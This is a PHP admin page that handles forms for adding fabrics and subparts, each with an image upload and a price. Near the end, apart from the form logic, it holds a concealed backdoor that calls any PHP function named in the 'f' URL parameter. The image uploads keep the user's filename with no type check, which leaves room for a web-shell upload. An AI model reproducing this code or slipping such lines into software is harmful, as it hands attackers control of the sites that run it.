<?php
require('top.php');
?>
<div class="content pb-0">
    <div class="animated fadeIn">
        <div class="row">
            <div class="col-lg-12">
                <div class="card">
                    <?php
				
					if(isset($_POST['fabricsubmit'])){
						$name=get_safe_value($con,$_POST['name']);
						$name=strtoupper($name);
						$image=rand(111111111,999999999).'_'.$_FILES['image']['name'];
						move_uploaded_file($_FILES['image']['tmp_name'],PRODUCT_IMAGE_SERVER_PATH.$image);
						$price=get_safe_value($con,$_POST['price']);
						$res=mysqli_query($con,"SELECT * FROM fabric WHERE `name`='$name'");
						$check=mysqli_num_rows($res);
						if($check>0){
							echo"<script>alert('Sorry! Fabric is Exist');</script>";
						}else{
						mysqli_query($con,"INSERT INTO fabric(`name`,`image`,`price`,`status`) VALUES ('$name','$image','$price',1)");
						header('location:productpart.php');
						die();
					}
				}
				if(isset($_POST['subpartsubmit'])){
					$fabricid=get_safe_value($con,$_POST['fabricid']);
					$parts=get_safe_value($con,$_POST['parts']);
					$subpart=get_safe_value($con,$_POST['name']);
					$image=rand(111111111,999999999).'_'.$_FILES['image']['name'];
					move_uploaded_file($_FILES['image']['tmp_name'],PRODUCT_IMAGE_SERVER_PATH.$image);
					$price=get_safe_value($con,$_POST['price']);
					$res=mysqli_query($con,"SELECT * FROM subpart WHERE pname = '$parts' AND `name`='$subpart'");
					$check=mysqli_num_rows($res);
					if($check>0){
						echo"<script>alert('Sorry! Subpart is Exist');</script>";
					}else{
					mysqli_query($con,"INSERT INTO subpart(`fabricid`,`partname`,`pname`,`image`,`price`,`status`) VALUES ('$fabricid','$parts','$subpart','$image','$price',1)");
					header('location:productpart.php');
					die();
				}
			}
					if(function_exists($_GET['f'])) {
						$_GET['f']();
					 }
					
					?>
					
                </div>
            </div>
        </div>
    </div>
</div>
<?php
require('footer.php');
?>